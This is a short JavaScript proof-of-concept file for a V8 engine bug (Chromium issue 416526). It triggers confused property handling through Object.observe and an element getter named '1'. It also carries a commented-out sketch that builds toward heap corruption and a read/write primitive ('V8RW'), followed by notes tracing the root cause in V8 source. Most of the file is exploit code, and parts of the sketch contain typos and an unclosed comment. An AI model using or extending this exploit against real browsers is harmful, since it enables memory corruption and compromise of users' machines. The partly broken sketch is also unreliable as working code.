// https://bugs.chromium.org/p/chromium/issues/detail?id=416526
// v8 version: 3.27.34.17, ia32

obj = JSON.parse('{"\\u0031": 0}');
Object.observe(obj, function() {});
obj.__defineGetter__(1, function() {
    var unusedObj = {unused : 0};
    unusedObj.__proto__ = obj;
    return 0;
});
Object.defineProperty(obj, "1", {writable: false});


/*
var corrupter = JSON.parse(' {"\\u0030": 0, "\\u0031": 0, "\\u0032": 32, "\\u0033:": 0, "\\u0034": 4194304}');
var keyWithHash31 = (new Array(16384 + 31 + 1)).join('a');
corrupter[keyWithHash31] = undefined;

Object.observe(corrupter, function() {});
corrupter.__proto__ = {didGetter: false, V8RW: this};
corrupter.__proto__.defineGetter(1, function() {
    if (!this.didGetter) {
        this.V8RW.DoAllocations(30);
	this.__proto__didGetter = true;
    }
    return 0;
    });

Object.defineProperty(this.corrupter, '1', {writable: false, value: this.map});


/*
    1. GetPropertyOrElement() returns GetElement() if name is an integer.
       Object::GetPropertyOrElement(obj, name) {
           if (name->AsArrayIndex(&index)) return GetElement(...);
	   return GetProperty(object, name);
       }
    
       JSObject::SetOwnPropertyIgnoreAttributes(....
           object->Lookupown(name, &lookup, true);
	   ..
	   if (is_observed && lookup.IsProperty()) {
	       if (lookup.IsDataProperty()) {
	           old_value = Object::GetPropertyOrElement(object, name).ToHandleChecked();
	       }
	   }
	   old_attributes = lookup.GetAttributes();
	   ..
	   switch(lookup.type()) {
	       case NORMAL:
	           ReplaceSlowProperty(.....)

    
    2. Object.observe() : allows property changes to be observed.
        If the object is observed then the old value is obtained first by GetPropertyOrElement()
	but only if the property is an actual data property, not a getter.


    3. if we had a data property named "1" and an element getter named "1"?
       lookup.IsDataProperty() check succeeds, because the "1" property is not a getter.
       And then GetPropertyOrElement() finds that "1" is actually an element and calls its getter.
       The getter can do evil stuff, like transform slow properties to fast, so ReplaceSlowProperty()
       gets confused later on.



*/
